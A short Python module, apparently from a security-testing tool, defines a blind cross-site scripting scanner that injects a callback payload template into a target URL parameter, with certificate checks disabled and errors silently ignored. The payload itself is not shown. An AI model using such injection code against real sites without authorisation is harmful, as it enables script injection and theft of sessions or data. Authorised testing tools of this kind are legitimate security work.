import requests
from engine.config import BLIND_PAYLOAD_TEMPLATE

class BlindXSSScanner:

    def __init__(self, payload_url: str):
        self.payload_url = payload_url

    def generate_payload(self) -> str:
        return BLIND_PAYLOAD_TEMPLATE.format(payload_url=self.payload_url)

    def send(self, url: str, param: str) -> None:
        payload = self.generate_payload()
        try:
            requests.get(
                url,
                params={param: payload},
                timeout=10,
                verify=False,
                proxies={'http': None, 'https': None}
            )
        except requests.RequestException:
            pass